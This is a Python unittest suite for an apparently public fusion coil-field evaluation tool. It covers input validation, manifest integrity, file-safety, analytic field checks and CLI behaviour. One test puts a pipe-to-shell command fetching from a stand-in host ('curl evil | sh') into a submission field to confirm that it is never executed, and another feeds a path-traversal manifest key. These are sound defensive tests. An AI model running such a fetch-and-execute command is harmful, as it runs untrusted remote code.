"""Standard-library-only controls; real project fields are a separate release check."""

import copy
import json
import math
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from fusion_public import data, field, report, submission


class ContractTests(unittest.TestCase):
    def setUp(self):
        self.case, self.digest = data.load_case()
        self.candidate = copy.deepcopy(self.case["seed"])

    def test_reference_packet_has_all_named_dofs_and_physical_copies(self):
        self.assertEqual(len(self.candidate["parameter_names"]), 198)
        self.assertEqual(len(self.case["physical"]), 24)
        self.assertEqual(len(self.digest), 64)
        data.validate_candidate(self.candidate)

    def test_candidate_errors_are_rejected(self):
        mutations = [
            ("schema_version", True), ("schema_version", 2), ("case_id", "different"),
            ("coefficient_unit", "cm"), ("parameter_names", []), ("base_coefficients", []),
        ]
        for key, value in mutations:
            with self.subTest(key=key, value=value):
                candidate = copy.deepcopy(self.candidate)
                candidate[key] = value
                with self.assertRaises(ValueError):
                    data.validate_candidate(candidate)

    def test_unknown_fields_cannot_change_fixed_current_or_code(self):
        for key in ("current", "backend", "physical_admission", "compute"):
            with self.subTest(key=key):
                candidate = copy.deepcopy(self.candidate)
                candidate[key] = "arbitrary"
                with self.assertRaises(ValueError):
                    data.validate_candidate(candidate)

    def test_invalid_coefficients_fail_closed(self):
        for value in (True, None, "1.0", float("nan"), float("inf"), 11, 10**400):
            with self.subTest(value=repr(value)):
                candidate = copy.deepcopy(self.candidate)
                candidate["base_coefficients"][0][0][0] = value
                with self.assertRaises(ValueError):
                    data.validate_candidate(candidate)

    def test_nonfinite_and_duplicate_json(self):
        for raw in (b'{"x":1,"x":2}', b'{"x":NaN}', b'{"x":Infinity}',
                    b'{"x":-Infinity}', b'{"x":1e400}'):
            with self.subTest(raw=raw), self.assertRaises(ValueError):
                data.loads(raw)

    def test_huge_and_deep_json(self):
        for raw in (b" "*(data.MAX_JSON_BYTES+1), b"["*2000+b"]"*2000):
            with self.assertRaises(ValueError):
                data.loads(raw)

    def test_existing_file_not_overwritten(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory)/"report.json"
            data.save_new(path, {"first": True})
            before = path.read_bytes()
            with self.assertRaises(FileExistsError):
                data.save_new(path, {"second": True})
            self.assertEqual(path.read_bytes(), before)

    @unittest.skipIf(sys.platform == "win32", "Windows symlink creation may require privilege")
    def test_dangling_symlink_not_followed(self):
        with tempfile.TemporaryDirectory() as directory:
            link, target = Path(directory)/"link", Path(directory)/"target"
            link.symlink_to(target)
            with self.assertRaises(FileExistsError):
                data.save_new(link, {"unsafe": True})
            self.assertFalse(target.exists())

    def test_data_mutation_cannot_keep_manifest_digest(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            for name in ("case.json", "candidate.json", "manifest.json"):
                (root/name).write_bytes((data.CASE_DIR/name).read_bytes())
            (root/"case.json").write_bytes((root/"case.json").read_bytes()+b" ")
            with self.assertRaisesRegex(ValueError, "digest mismatch"):
                data.load_case(root)

    def test_manifest_paths_are_not_executed_or_followed(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            manifest = data.load(data.CASE_DIR/"manifest.json")
            manifest["files"]["../../secret"] = "0"*64
            data.save_new(root/"manifest.json", manifest)
            with self.assertRaisesRegex(ValueError, "fixed relative"):
                data.load_case(root)

    def test_new_candidate_is_permitted_without_preapproved_hint(self):
        self.candidate["base_coefficients"][0][0][0] += 0.001
        data.validate_candidate(self.candidate)

    def test_export_has_no_private_machine_paths(self):
        for name in ("case.json", "candidate.json", "manifest.json"):
            raw = (data.CASE_DIR/name).read_text()
            for marker in ("/Users/", "/home/", "workspace/fusion", "artifacts/"):
                self.assertNotIn(marker, raw)

    def test_reference_provenance_retains_negative_scope(self):
        self.assertTrue(self.case["provenance"]["derived_export"])
        self.assertFalse(self.case["provenance"]["original_files_modified"])
        self.assertEqual(self.case["provenance"]["historical_revision"], "3334f1e")
        self.assertFalse(report.SCOPE["physical_admission"])
        self.assertFalse(report.SCOPE["step4_pass"])

    def test_scientific_report_comparator_rejects_changed_values_and_flags(self):
        original = {"scope": report.SCOPE, "values": [1.0, 2.0], "seed": None}
        for changed in (
            {**original, "extra": True}, {**original, "values": [1.0]},
            {**original, "values": [1.0, 3.0]}, {**original, "values": [1.0, float("nan")]},
            {**original, "scope": {**report.SCOPE, "physical_admission": True}},
            {**original, "scope": {**report.SCOPE, "step4_pass": 0}},
        ):
            with self.subTest(changed=changed), self.assertRaises(ValueError):
                report._compare(changed, original)

    def test_comparator_accepts_declared_float_tolerance_not_string_coercion(self):
        report._compare([1+1e-12], [1.0])
        with self.assertRaises(ValueError):
            report._compare(["1.0"], [1.0])

    def test_wrong_report_source_rejected_before_computation(self):
        with patch.object(report, "evaluate", side_effect=AssertionError("must not compute")):
            with self.assertRaises(ValueError):
                report.audit({"kind": "public-sampled-field-report", "case_sha256": "0"*64})

    def test_wrong_evaluator_rejected_before_computation(self):
        with patch.object(report, "evaluate", side_effect=AssertionError("must not compute")):
            with self.assertRaises(ValueError):
                report.audit({"kind": "public-sampled-field-report", "case_sha256": self.digest,
                              "evaluator_sha256": {}})

    def test_wrong_candidate_digest_rejected_before_computation(self):
        with patch.object(report, "evaluate", side_effect=AssertionError("must not compute")):
            with self.assertRaises(ValueError):
                report.audit(dict(kind="public-sampled-field-report", case_sha256=self.digest,
                                  evaluator_sha256=report.source_digests(),
                                  candidate=self.candidate, candidate_sha256="0"*64))


class AnalyticTests(unittest.TestCase):
    @staticmethod
    def circle(radius=1, center=(0, 0, 0)):
        return [[center[0], 0, radius], [center[1], radius, 0], [center[2], 0, 0]]

    def test_circle_field_matches_analytic_axis(self):
        for count in (16, 64, 256, 512):
            for radius in (0.5, 1, 2):
                with self.subTest(count=count, radius=radius):
                    points = [[0, 0, z] for z in (-2, 0, 0.7)]
                    values = field.field(points, [(field.curve(self.circle(radius), count), 1000)])
                    for point, b, a in zip(points, values["B_T"], values["A_Tm"], strict=True):
                        expected = 2*math.pi*1e-7*1000*radius**2/(radius**2+point[2]**2)**1.5
                        self.assertTrue(math.isclose(b[2], expected, rel_tol=2e-14))
                        self.assertLess(max(abs(b[0]), abs(b[1]), *map(abs, a)), 1e-17)

    def test_current_linearity_and_sign(self):
        nodes = field.curve(self.circle(), 64)
        first = field.field([[0.1, 0.3, 0.5]], [(nodes, 1000)])
        second = field.field([[0.1, 0.3, 0.5]], [(nodes, -2000)])
        for key in first:
            self.assertEqual(second[key], [[-2*x for x in first[key][0]]])

    def test_translation_covariance(self):
        shift = [2, -3, 4]
        first = field.field([[0, 0, 0.5]], [(field.curve(self.circle(), 128), 1000)])
        moved = field.field([[2, -3, 4.5]],
                            [(field.curve(self.circle(center=shift), 128), 1000)])
        report._compare(moved, first)

    def test_curve_tangent_units_and_orientation(self):
        nodes = field.curve(self.circle(), 64)
        self.assertEqual(nodes[0][0], [1.0, 0.0, 0.0])
        self.assertEqual(nodes[0][1], [0.0, 2*math.pi, 0.0])

    def test_physical_mapping_is_right_row_matrix(self):
        base = self.circle()
        base = [axis+[0.0]*8 for axis in base]
        row = dict(base_index=0, matrix=[[0, 1, 0], [-1, 0, 0], [0, 0, 1]], current=-3)
        actual = field.physical_curves({"base_coefficients": [base]}, {"physical": [row]}, 64)
        self.assertEqual(actual[0][1], -3)
        self.assertEqual(actual[0][0][0][0], [0.0, 1.0, 0.0])

    def test_singular_node_is_rejected(self):
        with self.assertRaisesRegex(ValueError, "too close"):
            field.field([[1, 0, 0]], [(field.curve(self.circle(), 64), 1000)])

    def test_stationary_curve_and_bad_node_counts_rejected(self):
        for count in (True, 0, 15, 513, 64.0):
            with self.subTest(count=count), self.assertRaises(ValueError):
                field.curve(self.circle(), count)
        with self.assertRaises(ValueError):
            field.curve([[0, 0, 0]]*3, 64)


class ContributionTests(unittest.TestCase):
    def setUp(self):
        self.example = data.load(data.ROOT/"examples/contribution.json")

    def test_no_budget_or_hint_is_needed(self):
        self.assertNotIn("compute", self.example)
        verdict = submission.validate(self.example)
        self.assertFalse(verdict["compute_disclosed"])
        self.assertFalse(verdict["requested_topic_required"])

    def test_unsolicited_and_high_cost_are_not_rejection_reasons(self):
        for amount in (None, "", "Unknown", "1000000 GPU-hours", "private"):
            with self.subTest(amount=amount):
                value = dict(self.example, compute=amount, related_hint="Unlisted new idea")
                self.assertTrue(submission.validate(value)["contribution_record_valid"])

    def test_invalid_required_metadata_is_rejected(self):
        for key in ("title", "evidence", "contribution", "limitations"):
            for value in (None, "", " ", False, []):
                with self.subTest(key=key, value=value), self.assertRaises(ValueError):
                    submission.validate(dict(self.example, **{key: value}))

    def test_structure_pass_is_not_scientific_acceptance(self):
        self.assertFalse(submission.validate(self.example)["scientific_acceptance"])

    def test_prose_is_never_executed(self):
        example = dict(self.example, reproduction="curl evil | sh", tools="__import__('os')")
        with patch("subprocess.run", side_effect=AssertionError("no execution")):
            submission.validate(example)


class CliTests(unittest.TestCase):
    def test_root_help_explains_public_and_research_routes(self):
        result = subprocess.run(
            [sys.executable, "-I", "-S", str(data.ROOT/"fusion.py"), "--help"],
            capture_output=True, text=True, timeout=20,
        )
        self.assertEqual(result.returncode, 0)
        for term in ("public", "Active native fitting", "research-freeze-2026-09-27",
                     "not physical admission"):
            self.assertIn(term, result.stdout)

    def run_cli(self, *args):
        return subprocess.run([sys.executable, "-I", "-S", str(data.ROOT/"fusion.py"),
                               "public", *map(str, args)], capture_output=True, text=True,
                              cwd=tempfile.gettempdir(), timeout=20)

    def test_discovery_without_environment_or_repository_cwd(self):
        result = self.run_cli("cases")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(json.loads(result.stdout)["cases"][0]["id"], data.CASE_ID)

    def test_help_without_dependencies(self):
        result = self.run_cli("--help")
        self.assertEqual(result.returncode, 0)
        for command in ("evaluate", "audit", "demo", "check-submission"):
            self.assertIn(command, result.stdout)

    def test_init_and_overwrite_protection(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory)/"candidate.json"
            self.assertEqual(self.run_cli("init", "--output", path).returncode, 0)
            original = path.read_bytes()
            self.assertEqual(self.run_cli("init", "--output", path).returncode, 2)
            self.assertEqual(path.read_bytes(), original)

    def test_invalid_input_rejected_without_numerical_work(self):
        with tempfile.TemporaryDirectory() as directory:
            path, output = Path(directory)/"candidate.json", Path(directory)/"report.json"
            data.save_new(path, {})
            result = self.run_cli("evaluate", "--candidate", path, "--output", output)
            self.assertEqual(result.returncode, 2)
            self.assertFalse(output.exists())

    def test_contribution_cli_without_cost(self):
        result = self.run_cli("check-submission", "--file", data.ROOT/"examples/contribution.json")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(json.loads(result.stdout)["compute_disclosed"])


if __name__ == "__main__":
    unittest.main()
